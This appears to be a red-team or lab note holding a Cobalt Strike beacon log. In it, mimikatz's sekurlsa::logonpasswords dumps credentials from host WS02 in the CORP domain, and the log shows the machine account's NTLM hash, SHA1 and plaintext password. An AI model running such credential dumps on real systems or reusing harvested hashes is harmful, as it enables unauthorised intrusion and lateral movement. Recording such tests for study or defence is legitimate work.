Notable Information:
WSO2 NTLM `c72e375bed0918ced38b7a8d3e7f5e09`
```bash
[11/15 13:02:11] beacon> logonpasswords
[11/15 13:02:11] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[11/15 13:02:11] [+] host called home, sent: 314699 bytes
[11/15 13:02:12] [+] received output:

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/15/2023 12:24:51 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS02$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 11/15/2023 12:24:51 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WS02$
	 * Domain   : CORP
	 * NTLM     : c72e375bed0918ced38b7a8d3e7f5e09
	 * SHA1     : ab2a9e7d654b6df43a49cd44d35a869ebf9d8d51
	tspkg :	
	wdigest :	
	 * Username : WS02$
	 * Domain   : CORP
	 * Password :  C(,XH/C<Paz1A>sF zf.j`V/^_T."Aq/l#cDitRw<B@m.7/e,;O^M*RHq/sqFlJb!GLotI\N5f6V571QZ)KO;*]MgnHW$<[txRNygHy0Axj`[e/egkT5bl4
	kerberos :	
	 * Username : ws02$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 44342 (00000000:0000ad36)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/15/2023 12:24:51 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WS02$
	 * Domain   : CORP
	 * NTLM     : c72e375bed0918ced38b7a8d3e7f5e09
	 * SHA1     : ab2a9e7d654b6df43a49cd44d35a869ebf9d8d51
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS02$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 11/15/2023 12:24:51 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WS02$
	 * Domain   : CORP
	 * Password :  C(,XH/C<Paz1A>sF zf.j`V/^_T."Aq/l#cDitRw<B@m.7/e,;O^M*RHq/sqFlJb!GLotI\N5f6V571QZ)KO;*]MgnHW$<[txRNygHy0Axj`[e/egkT5bl4
	kerberos :	
	 * Username : ws02$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
```